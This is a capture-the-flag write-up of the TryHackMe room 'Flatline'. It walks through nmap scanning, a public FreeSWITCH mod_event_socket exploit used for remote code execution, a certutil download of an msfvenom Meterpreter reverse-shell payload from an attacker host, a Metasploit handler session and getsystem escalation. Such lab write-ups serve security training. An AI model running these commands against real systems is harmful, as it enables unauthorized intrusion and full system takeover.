---
title: "Flatline"
date: 2025-02-19
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Flatline
categories: [TryHackMe, Easy]
tags: [linux, metasploit, rce]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Flatline</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>How low are your morals?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Windows</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/flatline">https://tryhackme.com/room/flatline</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Flatline.

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -Pn -p- 10.10.99.46
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 06:46 EDT
  Nmap scan report for 10.10.99.46
  Host is up (0.047s latency).
  Not shown: 65533 filtered tcp ports (no-response)
  PORT     STATE SERVICE
  3389/tcp open  ms-wbt-server
  8021/tcp open  ftp-proxy

  Nmap done: 1 IP address (1 host up) scanned in 105.01 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -Pn -p 3389,8021 10.10.99.46
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 06:48 EDT
  Nmap scan report for 10.10.99.46
  Host is up (0.040s latency).

  PORT     STATE SERVICE          VERSION
  3389/tcp open  ms-wbt-server    Microsoft Terminal Services
  | ssl-cert: Subject: commonName=WIN-EOM4PK0578N
  | Not valid before: 2025-03-10T10:44:58
  |_Not valid after:  2025-09-09T10:44:58
  |_ssl-date: 2025-03-11T10:49:00+00:00; -9s from scanner time.
  | rdp-ntlm-info: 
  |   Target_Name: WIN-EOM4PK0578N
  |   NetBIOS_Domain_Name: WIN-EOM4PK0578N
  |   NetBIOS_Computer_Name: WIN-EOM4PK0578N
  |   DNS_Domain_Name: WIN-EOM4PK0578N
  |   DNS_Computer_Name: WIN-EOM4PK0578N
  |   Product_Version: 10.0.17763
  |_  System_Time: 2025-03-11T10:48:55+00:00
  8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  Host script results:
  |_clock-skew: mean: -9s, deviation: 0s, median: -9s

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```
From here I proceeded the analysis port by port.

## Port 8021 Analysis

I began by researching the `freeswitch-event FreeSWITCH mod_event_socket` and discovered an interesting exploit on the <a href="https://www.exploit-db.com/exploits/47799">Exploit Database</a>. By executing the exploit, I was able to run commands on the system. Through this Remote Code Execution (RCE), I successfully retrieved the user flag:
```bash
$ python3 exploit.py 10.10.99.46 "whoami"                                                                                 
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
$ python3 exploit.py 10.10.99.46 "type C:\\Users\\Nekrotic\\Desktop\\user.txt"
Authenticated
Content-Type: api/response
Content-Length: 38

THM{[removed]} 
```

Next, I attempted to download an arbitrary file from my locally spawned webserver:
```bash
$ python3 exploit.py 10.10.99.46 "certutil.exe -urlcache -split -f http://[attackerip]/file.exe file.exe"
Authenticated
Content-Type: api/response
Content-Length: 150

10.10.99.46 - - [11/Mar/2025 07:12:02] code 404, message File not found
10.10.99.46 - - [11/Mar/2025 07:12:02] "GET /file.exe HTTP/1.1" 404 -
```

Since I was able to upload arbitrary files, I created and uploaded a malicious reverse shell using `certutil.exe`: 
```bash
$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=[attackerip] LPORT=4444 -f exe > metasploit.exe
$ python3 -m http.server -b [attackerip] 80
$ python3 exploit.py 10.10.99.46 "certutil.exe -urlcache -split -f http://[attackerip]/metasploit.exe metasploit.exe"
  Authenticated
  Content-Type: api/response
  Content-Length: 94

  ****  Online  ****
    000000  ...
    01204a
  CertUtil: -URLCache command completed successfully.
```

To receive the connection, I used Metasploit's multi-handler. I set the required options and started the handler. After that, I executed the `metasploit.exe` and received the Meterpreter shell:
```bash
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) > set lhost [attackerip]
lhost => [attackerip]
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set payload windows/meterpreter_reverse_tcp 
payload => windows/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on [attackerip]:4444 
[*] Meterpreter session 1 opened ([attackerip]:4444 -> 10.10.82.191:49835) at 2025-03-11 07:33:58 -0400

meterpreter >
```

Great! I gained initial access and was able to elevate my privileges using the Meterpreter's built-in `getsystem` command and retrieved the root flag:
```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > cd C:\\Users\\Nekrotic\\Desktop
meterpreter > cat root.txt
THM{[removed]]}
```

solved! :)